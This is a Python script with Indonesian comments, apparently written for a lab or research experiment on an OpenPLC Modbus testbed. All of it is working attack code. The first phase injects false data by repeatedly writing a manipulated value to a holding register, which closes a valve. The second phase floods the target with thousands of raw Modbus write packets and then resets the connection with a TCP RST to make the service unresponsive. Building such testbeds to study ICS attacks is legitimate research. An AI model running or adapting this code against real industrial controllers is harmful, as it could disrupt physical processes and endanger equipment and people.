#!/usr/bin/env python3
"""
attack_phase3.py

Perlakuan 3: Kombinasi False Data Injection (FDI) dan Flooding (DoS) dengan TCP RST.

Fase 1 (FDI)   : Menulis nilai manipulasi (default 1000) ke holding register target
                 secara periodik selama durasi tertentu. Menyebabkan mismatch data
                 antar-layer (Integrity terganggu).

Fase 2 (Flood) : Mengirim sejumlah besar permintaan Modbus write tanpa jeda,
                 kemudian menutup koneksi dengan TCP RST (melalui SO_LINGER=0).
                 Mengakibatkan layanan Modbus tidak responsif (Availability terganggu).

Validasi dapat dilakukan melalui:
- Wireshark       : Melihat paket Modbus write dan adanya RST di akhir flood.
- Terminal RasPi  : Melihat log sender (data normal tetap terkirim).
- Monitor OpenPLC : Melihat nilai register dan status valve; pada fase FDI valve
                    tertutup, pada fase flood layanan menjadi tidak responsif.

Penggunaan:
    python attack_phase3.py [--ip IP] [--port PORT] [--register REG] [--attack-value VAL]
                             [--fdi-duration DUR] [--fdi-interval INT] [--fdi-readback]
                             [--flood-count COUNT] [--flood-interval INT]
                             [--wait-between DETIK] [--skip-fdi] [--skip-flood]

Contoh:
    # Jalankan kedua fase dengan default
    python attack_phase3.py

    # Hanya fase FDI (tanpa flood)
    python attack_phase3.py --skip-flood

    # Hanya fase flood (tanpa FDI)
    python attack_phase3.py --skip-fdi

    # Flood dengan jumlah paket lebih banyak dan interval lebih rapat
    python attack_phase3.py --flood-count 50000 --flood-interval 0.0
"""

import argparse
import socket
import struct
import time
import sys

# ----------------------------------------------------------------------
#  Bagian 1: Modul untuk komunikasi Modbus TCP
# ----------------------------------------------------------------------

def build_write(addr: int, value: int, transaction_id: int = 0) -> bytes:
    """
    Membangun paket Modbus TCP untuk write single register (fungsi 0x06).

    Format:
        Transaction ID (2B)  - diisi increment
        Protocol ID   (2B)  - 0
        Length        (2B)  - 6 (jumlah byte berikutnya)
        Unit ID       (1B)  - 1
        Function Code (1B)  - 6
        Register Addr(2B)
        Value         (2B)
    """
    return struct.pack('>HHHBBHH',
                       transaction_id,  # transaction id
                       0,               # protocol id
                       6,               # length
                       1,               # unit id (default 1)
                       6,               # function code write single register
                       addr,            # register address
                       value)           # value to write

# ----------------------------------------------------------------------
#  Bagian 2: Fase FDI (False Data Injection) menggunakan pymodbus
# ----------------------------------------------------------------------

def fase_fdi(args) -> bool:
    """
    Melakukan FDI: menulis nilai manipulasi ke register target secara periodik.
    Menggunakan pymodbus agar mudah melakukan read-back verifikasi.
    """
    print("\n[FASE 1] MEMULAI FALSE DATA INJECTION")
    print(f"  Target : {args.ip}:{args.port}, unit={args.unit_id}")
    print(f"  Register: {args.register}, nilai={args.attack_value}")
    print(f"  Durasi : {args.fdi_duration} detik, interval={args.fdi_interval} detik")

    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        from pymodbus.client.sync import ModbusTcpClient

    client = ModbusTcpClient(host=args.ip, port=args.port, timeout=args.timeout)
    if not client.connect():
        print("[FASE 1] Gagal terhubung ke target!")
        return False

    start_time = time.monotonic()
    count = 0
    success = 0
    failed = 0

    try:
        while time.monotonic() - start_time < args.fdi_duration:
            count += 1
            # Write nilai serangan
            write_response = client.write_register(args.register, args.attack_value, unit=args.unit_id)
            if write_response.isError() if hasattr(write_response, 'isError') else False:
                failed += 1
                print(f"[FASE 1] Write #{count} GAGAL")
            else:
                success += 1
                # Read-back bila diinginkan
                if args.fdi_readback:
                    time.sleep(0.05)  # jeda singkat agar register stabil
                    read_response = client.read_holding_registers(args.register, 1, unit=args.unit_id)
                    if read_response.isError() if hasattr(read_response, 'isError') else False:
                        print(f"[FASE 1] Write #{count} OK, tetapi read-back gagal")
                    else:
                        val = read_response.registers[0]
                        if val == args.attack_value:
                            print(f"[FASE 1] Write #{count} OK, value={val} (sesuai)")
                        else:
                            print(f"[FASE 1] Write #{count} OK, value={val} (tidak sesuai!)")
                else:
                    # Tanpa read-back, cukup cetak sukses setiap 100 kali agar tidak terlalu banyak output
                    if count % 100 == 0:
                        print(f"[FASE 1] Write #{count} OK")
            # Tunggu interval
            time.sleep(args.fdi_interval)

    except KeyboardInterrupt:
        print("\n[FASE 1] Dihentikan oleh pengguna.")
    finally:
        client.close()
        print(f"[FASE 1] Selesai. Success={success}, Failed={failed}")
    return success > 0

# ----------------------------------------------------------------------
#  Bagian 3: Fase Flooding dengan TCP RST (menggunakan socket mentah)
# ----------------------------------------------------------------------

def fase_flood(args) -> bool:
    """
    Melakukan flooding: mengirim banyak write request tanpa membaca response,
    lalu menutup koneksi dengan RST (SO_LINGER=0).
    """
    print("\n[FASE 2] MEMULAI FLOODING DENGAN TCP RST")
    print(f"  Target : {args.ip}:{args.port}")
    print(f"  Register: {args.register}, nilai={args.attack_value}")
    print(f"  Jumlah paket: {args.flood_count}, interval={args.flood_interval} detik")

    # Buat socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Atur SO_LINGER agar saat close() mengirim RST (timeout 0)
    l_onoff = 1
    l_linger = 0
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))

    try:
        sock.connect((args.ip, args.port))
        print("[FASE 2] Koneksi berhasil, mulai mengirim paket...")
    except Exception as e:
        print(f"[FASE 2] Gagal koneksi: {e}")
        return False

    count = 0
    try:
        for i in range(args.flood_count):
            tid = i % 65535
            packet = build_write(args.register, args.attack_value, tid)
            try:
                sock.send(packet)
                count += 1
                if count % 1000 == 0:
                    print(f"[FASE 2] Terkirim {count} paket")
                if args.flood_interval > 0:
                    time.sleep(args.flood_interval)
            except Exception as e:
                print(f"[FASE 2] Gagal kirim paket ke-{count+1}: {e}")
                break

        # Tutup socket dengan RST (karena SO_LINGER=0)
        print(f"[FASE 2] Menutup koneksi dengan RST (total {count} paket terkirim)")
        sock.close()
    except KeyboardInterrupt:
        print("\n[FASE 2] Dihentikan oleh pengguna.")
        sock.close()
    return True

# ----------------------------------------------------------------------
#  Bagian 4: Main dan Argumen
# ----------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Perlakuan 3: FDI + Flooding dengan TCP RST",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--ip", default="10.0.0.1", help="IP OpenPLC (default: 10.0.0.1)")
    parser.add_argument("--port", type=int, default=502, help="Port Modbus (default: 502)")
    parser.add_argument("--unit-id", type=int, default=1, help="Unit ID (default: 1)")
    parser.add_argument("--register", type=int, default=1024, help="Holding register target (default: 1024)")
    parser.add_argument("--attack-value", type=int, default=1000, help="Nilai serangan (default: 1000)")

    # Parameter Fase FDI
    parser.add_argument("--fdi-duration", type=float, default=10.0, help="Durasi FDI dalam detik (default: 10)")
    parser.add_argument("--fdi-interval", type=float, default=0.4, help="Interval antar write FDI (default: 0.4)")
    parser.add_argument("--fdi-readback", action="store_true", help="Aktifkan read-back untuk verifikasi")

    # Parameter Fase Flood
    parser.add_argument("--flood-count", type=int, default=10000, help="Jumlah paket flood (default: 10000)")
    parser.add_argument("--flood-interval", type=float, default=0.0, help="Interval antar paket flood, 0 = tanpa jeda (default: 0.0)")

    # Parameter tambahan
    parser.add_argument("--wait-between", type=float, default=2.0, help="Jeda antara fase 1 dan 2 dalam detik (default: 2)")
    parser.add_argument("--timeout", type=float, default=3.0, help="Timeout koneksi (default: 3)")
    parser.add_argument("--skip-fdi", action="store_true", help="Lewati fase FDI, langsung ke flood")
    parser.add_argument("--skip-flood", action="store_true", help="Lewati fase flood, hanya FDI")

    args = parser.parse_args()

    print("="*60)
    print(" PERLAKUAN 3 : FDI + FLOODING dengan TCP RST")
    print("="*60)
    print(f"Target: {args.ip}:{args.port}, Unit ID={args.unit_id}")
    print(f"Register: {args.register}, Nilai serangan: {args.attack_value}")
    print("="*60)

    # Jalankan fase FDI jika tidak di-skip
    if not args.skip_fdi:
        if not fase_fdi(args):
            print("[INFO] Fase FDI gagal, tetap melanjutkan ke fase flood (jika tidak di-skip).")
    else:
        print("[INFO] Fase FDI dilewati.")

    # Jeda antar fase
    if not args.skip_flood:
        print(f"\n[INFO] Menunggu {args.wait_between} detik sebelum fase flood...")
        time.sleep(args.wait_between)
        fase_flood(args)
    else:
        print("[INFO] Fase flood dilewati.")

    print("\n[INFO] Perlakuan 3 selesai.")

if __name__ == "__main__":
    main()